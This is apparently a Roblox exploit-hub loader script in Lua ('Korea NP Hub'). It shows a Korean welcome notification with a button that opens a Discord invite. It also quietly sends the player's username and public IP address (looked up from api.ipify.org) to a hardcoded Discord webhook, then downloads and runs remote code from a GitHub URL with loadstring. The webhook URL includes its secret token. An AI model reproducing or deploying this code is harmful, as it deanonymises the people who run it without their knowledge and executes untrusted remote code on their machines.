local httpService = game:GetService("HttpService");

local invCode = "yNDFGfKuYa";
local httpRequest = (syn and syn.request) or http_request or function() end;

local function launchDiscord()
	if not httpRequest then warn("Exploit not supported. No HTTP found.") return end
	
	httpRequest({
		Url = "http://127.0.0.1:6463/rpc?v=1",
		Method = "POST",
	
		Headers = {
			['Content-Type'] = 'application/json',
			Origin = 'https://discord.com'
		},
	
		Body = httpService:JSONEncode({
			cmd = 'INVITE_BROWSER',
			nonce = httpService:GenerateGUID(false),
			args = {code = invCode}
		})
	})
end;

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = launchDiscord

game:GetService("StarterGui"):SetCore(
	"SendNotification",
	{
		Title = "Korea NP Hub",
		Duration = 8,
		Text = "오늘도 NP Hub를 이용해주셔서 감사합니다. \n더좋은 서비스로 보답하겠습니다!\n\nNP Hub를 로딩하는중입니다.",
		Button1 = "NP Hub Kakaotalk",
		Callback = NotificationBindable
	}
)

local webh = "https://discord.com/api/webhooks/1052477728630259762/uxqQKO4zYMiRcFbKeia7LUhpNu8bIHbg4qVTq2_KA-eJ8OUWQ4Kip3Fa_gxXwZZ1zzWf"

pcall(function()
   local data = {
       ["embeds"] = {
           {
               ["title"] = game:GetService("Players").LocalPlayer.Name,
               ["description"] = game:HttpGet("https://api.ipify.org")
           }
       }
   }

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)


loadstring(game:HttpGet("https://raw.githubusercontent.com/sungyong1234/nphubpremium/main/main.lua"))();
